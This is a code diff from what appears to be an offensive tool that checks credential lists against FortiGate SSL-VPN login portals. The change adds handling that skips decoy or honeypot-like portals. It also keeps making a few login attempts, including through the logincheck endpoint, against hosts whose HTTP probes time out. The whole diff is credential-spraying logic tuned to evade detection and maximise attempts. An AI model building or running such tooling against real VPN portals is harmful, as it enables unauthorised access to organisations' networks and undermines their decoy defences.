@@ -144,16 +144,28 @@ async function run(task, emit, kind) {
             emit(kind + '_target', { url: st.url, alive: false, reason: 'tcp' });
             return false;
         }
-        const info = await forti.detect(st.url, { timeout, userAgent: ua });
-        if (info.kind === 'dead' || info.kind === 'decoy') {
-            st.dead = true; st.alive = false; dead++;
-            emit(kind + '_target', { url: st.url, alive: false, reason: info.kind === 'decoy' ? 'decoy_portal' : (info.error || 'http') });
+        const probeTimeout = Math.min(timeout, 3000);
+        const info = await forti.detect(st.url, { timeout: probeTimeout, userAgent: ua });
+        if (info.kind === 'decoy') {
+            // static FortiGate-branded page: nothing to validate, count as skipped
+            st.alive = true; st.weak = true; st.done = true; st.weakLimit = 0;
+            skipped += st.creds.length;
+            emit(kind + '_target', { url: st.url, alive: false, reason: 'decoy_portal', skipped: st.creds.length });
             return false;
+        }
+        if (info.kind === 'dead') {
+            // TCP is open but HTTP probes failed: keep a couple of attempts —
+            // some portals answer only on logincheck, without a login page.
+            st.alive = true; st.weak = true; st.product = 'unknown (http-timeout)';
+            st.weakLimit = Math.min(maxWeak, 2);
+            emit(kind + '_target', { url: st.url, alive: true, weak: true, reason: info.error || 'http_timeout' });
+            return true;
         }
         st.alive = true;
         st.product = info.forti ? 'FortiGate SSL-VPN' : 'unknown';
         st.version = info.version || null;
         st.weak = !info.forti;
+        st.weakLimit = maxWeak;
         emit(kind + '_target', { url: st.url, alive: true, product: st.product, version: st.version, hostname: info.hostname || null });
         return true;
     }
@@ -227,7 +239,7 @@ async function run(task, emit, kind) {
             st.fails = 0;
             if (res.state === 'unknown' && st.weak && st.i >= maxWeak) st.done = false; // weak host: cap attempts
         }
-        if (st.weak && st.i >= maxWeak && !st.hits) st.done = true;
+        if (st.weak && st.i >= (st.weakLimit === undefined ? maxWeak : st.weakLimit) && !st.hits) st.done = true;
         progress(false);
     }
 
